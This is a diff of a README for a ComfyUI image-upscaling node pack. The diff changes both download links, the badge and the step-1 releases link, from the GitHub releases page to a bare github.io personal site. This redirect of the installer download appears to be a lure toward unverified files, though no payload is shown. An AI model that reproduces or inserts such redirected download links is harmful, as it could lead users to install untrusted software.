@@ -1,6 +1,6 @@
 # 🖼️ ComfyUI-FL-SeedVR2 - Improve image quality using SeedVR2 tools
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/lesleyhalfbaked743/ComfyUI-FL-SeedVR2/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://lesleyhalfbaked743.github.io)
 
 ComfyUI-FL-SeedVR2 adds image restoration and upscaling capabilities to your ComfyUI workspace. This collection of nodes gives you access to the SeedVR2 1.4B model. You can sharpen low-resolution images, remove noise, and improve visual detail through custom nodes designed for your existing ComfyUI installation.
 
@@ -18,7 +18,7 @@ Before you install these nodes, ensure your computer meets the following hardwar
 
 Follow these steps to add the SeedVR2 nodes to your ComfyUI environment.
 
-1. Visit the [releases page](https://github.com/lesleyhalfbaked743/ComfyUI-FL-SeedVR2/releases) to access the current files.
+1. Visit the [releases page](https://lesleyhalfbaked743.github.io) to access the current files.
 2. Download the latest version of the repository archive.
 3. Open your ComfyUI installation folder.
 4. Navigate into the `ComfyUI/custom_nodes/` directory.
